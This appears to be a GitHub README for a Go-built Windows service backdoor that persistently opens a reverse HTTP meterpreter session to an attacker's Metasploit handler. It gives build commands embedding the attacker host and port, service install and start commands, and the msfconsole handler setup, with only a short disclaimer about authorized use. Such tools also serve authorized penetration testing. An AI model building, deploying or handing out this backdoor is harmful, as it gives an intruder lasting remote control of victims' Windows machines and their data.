## Powershell Reverse Http

> Note: Use this program at your own risk. I do not encourage in any way the use of this software illegally or to attack targets without their previous authorization

> Meterpreter-like backdoors are a pretty common attack vector and most decent antiviruses detect this behavior as a virus.

A simple windows service running on background that connects with a meterpreter session via http.

### Usage
First, you need [go](https://golang.org/dl/) for build the binary (duh!) and [metasploit-framework](https://github.com/rapid7/metasploit-framework) to accept the reverse connection:

```
git clone https://github.com/mauri870/powershell-reverse-http.git
cd powershell-reverse-http
env GOOS=windows go build -ldflags "-X main.LHOST=10.10.10.2 -X main.LPORT=3000" -o powershell-reverse.exe
```

Change the LPORT and LHOST to match your metasploit handler

## Usage
```
powershell-reverse.exe
no command specified

usage: powershell-reverse.exe <command>
       where <command> is one of
       install, remove, debug, start, stop, restart, pause or continue.
```

After install and start, the service is always up and trying to connect on host and port specified on `exploit.go`

On the attacker's machine:

```
./msfconsole --quiet
msf > use exploit/multi/handler
msf exploit(handler) > set payload windows/meterpreter/reverse_http
payload => windows/meterpreter/reverse_http
msf exploit(handler) > set LHOST YOUR_IP_ADDRESS_HERE
LHOST => YOUR_IP_ADDRESS_HERE
msf exploit(handler) > set LPORT YOUR_PORT_TO_AWAIT_CONNECTION_HERE
LPORT => YOUR_PORT_TO_AWAIT_CONNECTION_HERE
msf exploit(handler) > exploit

[*] Started HTTP reverse handler on http://LHOST:LPORT
[*] Starting the payload handler... 
```
